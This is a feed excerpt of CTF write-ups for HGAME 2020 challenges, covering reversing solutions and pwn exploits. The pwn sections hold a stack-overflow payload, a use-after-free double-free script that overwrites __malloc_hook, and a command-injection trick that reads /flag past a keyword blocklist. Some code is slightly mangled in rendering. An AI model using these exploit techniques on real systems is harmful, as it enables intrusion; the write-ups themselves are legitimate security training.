<span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x41</span>, <span class="number">0x84</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x44</span>, <span class="number">0x82</span>, <span class="number">0x4A</span>, <span class="number">0x85</span>, <span class="number">0x8C</span>, <span class="number">0x82</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>, <span class="number">0x82</span>, <span class="number">0x4D</span>, <span class="number">0x90</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0x54</span>, <span class="number">0x98</span>, <span class="number">0x88</span>, <span class="number">0x96</span>, <span class="number">0x98</span>, <span class="number">0x57</span>, <span class="number">0x95</span>, <span class="number">0x8F</span>, <span class="number">0xA6</span>]</span><br><span class="line">key=list(range(<span class="number">42</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">key[i]=box[i]-i</span><br><span class="line">print(chr(key[i]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></div><h2 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h2><p>C#的exe，dnspy分析发现使用了AES，CBC模式，并且使用base64加密了一下，直接提取出来解就行</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode,b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span><span class="params">(text)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(text.encode(<span class="string">'utf‐8'</span>)) % <span class="number">16</span>:</span><br><span class="line">add = <span class="number">16</span> ‐ (len(text.encode(<span class="string">'utf‐8'</span>)) % <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">add = <span class="number">0</span></span><br><span class="line">text = text + (<span class="string">'\0'</span> * add)</span><br><span class="line"><span class="keyword">return</span> text.encode(<span class="string">'utf‐8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text)</span>:</span></span><br><span class="line">key = <span class="string">'Hg4m3_2o20_WeeK2'</span>.encode(<span class="string">'utf‐8'</span>)</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = <span class="string">b'0PuOh9IlX054Icts'</span></span><br><span class="line">text = add_to_16(text)</span><br><span class="line">cryptos = AES.new(key, mode, iv)</span><br><span class="line">cipher_text = cryptos.encrypt(text)</span><br><span class="line"><span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(text, iv)</span>:</span></span><br><span class="line">key = b64decode(<span class="string">b"SGc0bTNfMm8yMF9XZWVLMg=="</span>)</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">cryptos = AES.new(key, mode, iv)</span><br><span class="line">plain_text = cryptos.decrypt(text)</span><br><span class="line"><span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line">data = decrypt(b64decode(<span class="string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span>), b64decode(<span class="string">b"MFB1T2g5SWxYMDU0SWN0cw=="</span>)).decode()</span><br><span class="line">str4 = <span class="string">"Same_ciphertext_"</span></span><br><span class="line">iv = b64decode(<span class="string">b"MFB1T2g5SWxYMDU0SWN0cw=="</span>).decode()</span><br><span class="line">res = []</span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">res.append(ord(data[i]) ^ ord(iv[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">new_iv += chr(res[i] ^ ord(str4[i]))</span><br><span class="line">str2 = b64encode(new_iv.encode(<span class="string">'utf‐8'</span>)).decode()</span><br><span class="line"></span><br><span class="line">destinationArray = b64decode(<span class="string">"dJntSWSPWbWocAq4yjBP5Q=="</span>)</span><br><span class="line">str3 = decrypt(destinationArray, encrypt(str4)).decode()[:‐<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"hgame&#123;"</span>+str2+str3+<span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure></div><h2 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h2><p>给的是python的字节码</p><p>自己分析了一下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> secret <span class="keyword">import</span> flag, encrypt</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: encrypt(flag)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">'7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: dis.dis(encrypt)</span><br><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (OOo)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">              <span class="number">4</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">1</span> (<span class="number">-1</span>)</span><br><span class="line">              <span class="number">8</span> BUILD_SLICE              <span class="number">3</span></span><br><span class="line">             <span class="number">10</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">12</span> STORE_FAST               <span class="number">1</span> (flag)     <span class="comment"># flag = OOo[::-1]</span></span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">14</span> LOAD_GLOBAL              <span class="number">0</span> (list)</span><br><span class="line">             <span class="number">16</span> LOAD_FAST                <span class="number">1</span> (flag)</span><br><span class="line">             <span class="number">18</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">20</span> STORE_FAST               <span class="number">2</span> (flag)     <span class="comment"># flag = list(flag)</span></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">22</span> SETUP_LOOP              <span class="number">50</span> (to <span class="number">74</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_GLOBAL              <span class="number">1</span> (range)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">28</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">30</span> LOAD_FAST                <span class="number">2</span> (flag)     <span class="comment"># range(1,len(flag))</span></span><br><span class="line">             <span class="number">32</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">34</span> CALL_FUNCTION            <span class="number">2</span></span><br><span class="line">             <span class="number">36</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">38</span> FOR_ITER                <span class="number">32</span> (to <span class="number">72</span>)   <span class="comment"># for i in range(1,len(flag))</span></span><br><span class="line">             <span class="number">40</span> STORE_FAST               <span class="number">3</span> (i)      <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">  <span class="number">7</span>          <span class="number">42</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">44</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">46</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">48</span> BINARY_SUBTRACT</span><br><span class="line">             <span class="number">50</span> BINARY_SUBSCR                        <span class="comment"># flag[i-1]</span></span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">54</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">56</span> BINARY_SUBSCR                        <span class="comment"># flag[i]</span></span><br><span class="line">             <span class="number">58</span> BINARY_XOR</span><br><span class="line">             <span class="number">60</span> STORE_FAST               <span class="number">4</span> (Oo)      <span class="comment"># Oo = flag[i-1] ^ flag[i]</span></span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">62</span> LOAD_FAST                <span class="number">4</span> (Oo)</span><br><span class="line">             <span class="number">64</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> STORE_SUBSCR                         <span class="comment"># flag[i] = Oo</span></span><br><span class="line">             <span class="number">70</span> JUMP_ABSOLUTE           <span class="number">38</span></span><br><span class="line">        &gt;&gt;   <span class="number">72</span> POP_BLOCK</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>     &gt;&gt;   <span class="number">74</span> LOAD_GLOBAL              <span class="number">3</span> (bytes)</span><br><span class="line">             <span class="number">76</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">78</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">80</span> STORE_FAST               <span class="number">5</span> (O)       <span class="comment"># O = bytes(flag)</span></span><br><span class="line"></span><br><span class="line"> <span class="number">10</span>          <span class="number">82</span> LOAD_FAST                <span class="number">5</span> (O)</span><br><span class="line">             <span class="number">84</span> LOAD_METHOD              <span class="number">4</span> (hex)     <span class="comment"># hex(O)</span></span><br><span class="line">             <span class="number">86</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">             <span class="number">88</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: exit()</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">"sfesefsfhthfyhjjus"</span></span><br><span class="line">O0o = list(flag)</span><br><span class="line">out_flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(O0o)):</span><br><span class="line">O0 = i</span><br><span class="line">Oo = ord(O0o[O0<span class="number">-1</span>])^ord(O0o[O0])</span><br><span class="line">O0o [O0] = Oo</span><br></pre></td></tr></table></figure></div><p>逆向即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = <span class="string">"7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22"</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(q),<span class="number">2</span>):</span><br><span class="line">    flag.append(int(q[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">flags = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">flag = flag[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)<span class="number">-1</span>):</span><br><span class="line">    flag[i] = flag[i+<span class="number">1</span>]^flag[i]</span><br><span class="line">    flags += chr(flag[i])</span><br><span class="line">flags += chr(<span class="number">0x7d</span>)</span><br><span class="line"><span class="keyword">print</span> flags</span><br></pre></td></tr></table></figure></div><h2 id="findyourself"><a href="#findyourself" class="headerlink" title="findyourself"></a>findyourself</h2><p>有两个check</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">check1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">   &#123;</span><br><span class="line"> <span class="keyword">if</span> ( (a1[i] &lt;= <span class="number">96</span> || a1[i] &gt; <span class="number">122</span>) &amp;&amp; (a1[i] &lt;= <span class="number">64</span> || a1[i] &gt; <span class="number">90</span>) &amp;&amp; a1[i] != <span class="number">47</span> &amp;&amp; a1[i] != <span class="number">32</span> &amp;&amp; a1[i] != <span class="number">45</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"sh"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"cat"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"flag"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"pwd"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"export"</span>) )</span><br><span class="line">  result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">result = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">check2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">42</span>)</span><br><span class="line">|| <span class="built_in">strstr</span>(a1, <span class="string">"sh"</span>)|| <span class="built_in">strstr</span>(a1, <span class="string">"cat"</span>)|| <span class="built_in">strstr</span>(a1, <span class="string">".."</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">38</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">124</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">62</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">60</span>) )  &#123;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">else</span>  &#123;</span><br><span class="line">      result = <span class="number">0L</span>L;  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>过滤了常用的查看命令</p><p>思路是将flag读出作为新文件的文件名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat /flag&gt;/tmp/`cat /flag`</span><br></pre></td></tr></table></figure></div><h2 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h2><p>存在UAF</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index?"</span>);</span><br><span class="line">  v1 = readi(<span class="string">"index?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">list</span>[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">list</span>[v1]);    &lt;============</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>于是泄露libc修改__malloc_hook到one_gadget</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'47.103.214.163'</span>,<span class="number">21002</span>)</span><br><span class="line"><span class="comment">#io = process('./Roc826')</span></span><br><span class="line"><span class="comment">#elf = ELF(EXEC_FILE)</span></span><br><span class="line">libc = ELF(REMOTE_LIBC)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'?'</span>,str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span> </span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>) </span><br><span class="line">   io.sendlineafter(<span class="string">'?'</span>,str(idx))</span><br><span class="line">add(<span class="number">0x89</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">unsorted_bin = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line"><span class="keyword">print</span> hex(unsorted_bin)</span><br><span class="line">libc_addr = unsorted_bin - <span class="number">3951392</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"></span><br><span class="line">__malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'c'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'d'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'e'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p64(__malloc_hook<span class="number">-35</span>)*<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'f'</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'g'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="number">19</span>*<span class="string">'\x00'</span>+p64(libc_addr+<span class="number">0xf1147</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'?'</span>,str(<span class="number">0x68</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2020HGAME-Week2-WP&quot;&gt;&lt;a href=&quot;#2020HGAME-Week2-WP&quot; class=&quot;headerlink&quot; title=&quot;2020HGAME Week2 WP&quot;&gt;&lt;/a&gt;2020HGAME Week2 WP&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020HGAME Week1 Pwn WP</title>
    <link href="https://kabeor.github.io/2020HGAME%20Week1%20Pwn%20WP/"/>
    <id>https://kabeor.github.io/2020HGAME%20Week1%20Pwn%20WP/</id>
    <published>2020-01-24T16:00:00.000Z</published>
    <updated>2020-03-16T04:54:07.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020HGAME-Week1-Pwn-WP"><a href="#2020HGAME-Week1-Pwn-WP" class="headerlink" title="2020HGAME Week1 Pwn WP"></a>2020HGAME Week1 Pwn WP</h1><h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">160u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;byte_80486E0, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>要求输出从v5开始与七位字符串比较，字符串为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rodata:080486E0 byte_80486E0    db 30h                  ; DATA XREF: main+85↑o</span><br><span class="line">.rodata:080486E1                 db  4Fh ; O</span><br><span class="line">.rodata:080486E2                 db  30h ; 0</span><br><span class="line">.rodata:080486E3                 db  6Fh ; o</span><br><span class="line">.rodata:080486E4                 db    0</span><br><span class="line">.rodata:080486E5                 db 4Fh</span><br><span class="line">.rodata:080486E6                 db  30h ; 0</span><br></pre></td></tr></table></figure></div><p>因此直接填充到v5位置然后写入即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'47.103.214.163'</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="comment">#p=process('./Hard_AAAAA')</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Let\'s 0O0o'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">123</span>+<span class="string">'0O0o'</span>+<span class="string">'\x00'</span>+<span class="string">'O0'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4[<span class="number">11</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's Pwn me with numbers!"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )           <span class="comment">//////可写0x13*8</span></span><br><span class="line">    v4[i] = readll();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">readll</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0L</span>L;</span><br><span class="line">  v2 = <span class="number">0L</span>L;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr[i], <span class="number">1u</span>LL) &gt; <span class="number">0</span> &amp;&amp; i &lt;= <span class="number">19</span> &amp;&amp; nptr[i] != <span class="number">10</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> atoll(nptr);     <span class="comment">/////////转换为长整数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub     rsp, 60h</span><br></pre></td></tr></table></figure></div><p>因此存在栈溢出</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa 